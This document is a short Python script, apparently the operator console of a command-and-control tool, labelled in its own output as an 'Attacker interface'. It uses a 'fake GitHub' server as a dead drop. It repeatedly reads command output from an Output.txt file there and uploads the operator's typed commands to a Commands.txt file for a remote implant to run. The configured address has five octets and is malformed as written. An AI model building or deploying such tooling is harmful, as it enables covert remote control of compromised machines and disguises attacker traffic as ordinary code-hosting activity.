#!/usr/bin/env python3
import time
import requests

# Base URL for your fake GitHub
FAKE_GITHUB_BASE = "http://10.10.10.10.2/fake-github"
COMMANDS_URL = FAKE_GITHUB_BASE + "/Commands.txt"
OUTPUT_URL   = FAKE_GITHUB_BASE + "/Output.txt"

def fetch_output():
    """Fetch the output from the fake GitHub Output.txt file."""
    try:
        response = requests.get(OUTPUT_URL)
        if response.status_code == 200:
            return response.text.strip()
        else:
            print("Failed to fetch output, status code:", response.status_code)
    except Exception as e:
        print("Error fetching output:", e)
    return None

def upload_command(command):
    """Upload a new command to the fake GitHub Commands.txt file."""
    try:
        response = requests.put(COMMANDS_URL, data=command)
        if response.status_code in (200, 201):
            print("Command uploaded successfully.")
        else:
            print("Failed to upload command, status code:", response.status_code)
    except Exception as e:
        print("Error uploading command:", e)

def main():
    last_output = None
    print("Attacker interface started.")
    while True:
        # Poll the Output.txt file for changes
        current_output = fetch_output()
        if current_output is not None and current_output != last_output:
            print("\n--- New Output ---")
            print(current_output)
            last_output = current_output
        
        # Prompt for new command
        new_command = input("\nEnter a new command (or press Enter to skip): ").strip()
        if new_command:
            upload_command(new_command)
        
        # Pause before polling again
        time.sleep(5)

if __name__ == "__main__":
    main()
